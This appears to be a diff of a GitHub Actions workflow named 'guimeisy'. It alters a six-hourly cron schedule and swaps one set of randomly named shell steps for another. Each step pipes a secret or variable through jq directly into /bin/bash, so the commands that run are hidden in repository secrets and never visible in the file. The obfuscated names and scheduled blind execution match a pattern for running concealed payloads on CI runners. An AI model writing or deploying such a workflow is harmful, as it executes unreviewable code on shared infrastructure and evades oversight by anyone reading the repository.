@@ -3,7 +3,8 @@ name: guimeisy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 2/6 * * *'
+    - cron: '8 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,21 +13,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: guimeisy
         env:
-          mzaz19408: ${{ secrets.mzaz19408 }}
+          ds6866: ${{ secrets.ds6866 }}
         run: |
-          echo $mzaz19408 | jq -r .e4177 | /bin/bash
-          echo $st50059 | jq -r .ovyn86541 | /bin/bash
-          echo $wvzj720 | jq -r .a11 | /bin/bash
-          echo $ep7 | jq -r .t71027 | /bin/bash
-          echo $jd1 | jq -r .fhse26147 | /bin/bash
-          echo $le7506 | jq -r .x4 | /bin/bash
-          echo $nvp80794 | jq -r .x34091 | /bin/bash
-          echo $gl38 | jq -r .n387 | /bin/bash
-          echo $aujlp6 | jq -r .jcz210 | /bin/bash
-          echo $eup49804 | jq -r .i076 | /bin/bash
-          echo $c3794 | jq -r .av1276 | /bin/bash
-          echo $jqbg521 | jq -r .gfm9 | /bin/bash
-          echo $cdyr93572 | jq -r .sz22021 | /bin/bash
-          echo $g67 | jq -r .jhed21 | /bin/bash
-          echo $byspy94227 | jq -r .ldes2514 | /bin/bash
+          echo $ds6866 | jq -r .rq51 | /bin/bash
+          echo $xzg69778 | jq -r .ojyq8008 | /bin/bash
+          echo $wispl71 | jq -r .ekx55 | /bin/bash
+          echo $pk3 | jq -r .ibza3 | /bin/bash
+          echo $sw2 | jq -r .b01 | /bin/bash
+          echo $oucgv7951 | jq -r .ncdz3 | /bin/bash
+          echo $maq714 | jq -r .qlrx4 | /bin/bash
 
